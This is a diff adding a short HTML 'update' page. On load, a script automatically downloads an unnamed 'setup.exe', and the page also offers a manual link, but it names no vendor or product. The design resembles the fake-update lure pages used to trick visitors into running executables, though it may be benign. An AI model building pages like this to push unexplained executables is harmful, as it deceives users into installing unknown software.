@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Installing Update…</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
+            background: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            color: #333;
+        }
+        .wrap { text-align: center; max-width: 400px; padding: 32px; }
+        .spinner {
+            width: 48px; height: 48px;
+            border: 4px solid #e0e0e0;
+            border-top-color: #0078d4;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+            margin: 0 auto 24px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        h1 { font-size: 20px; font-weight: 600; margin-bottom: 8px; }
+        p  { font-size: 13px; color: #777; line-height: 1.5; }
+        .manual { margin-top: 20px; font-size: 12px; color: #aaa; }
+        .manual a { color: #0078d4; text-decoration: none; }
+        .manual a:hover { text-decoration: underline; }
+    </style>
+</head>
+<body>
+    <div class="wrap">
+        <div class="spinner"></div>
+        <h1>Downloading update…</h1>
+        <p>Your download should start automatically.<br>Please wait a moment.</p>
+        <p class="manual">Nothing happening? <a href="setup.exe" download>Click here</a></p>
+    </div>
+    <script>
+        (function () {
+            var a = document.createElement('a');
+            a.href = 'setup.exe';
+            a.download = 'setup.exe';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        })();
+    </script>
+</body>
+</html>
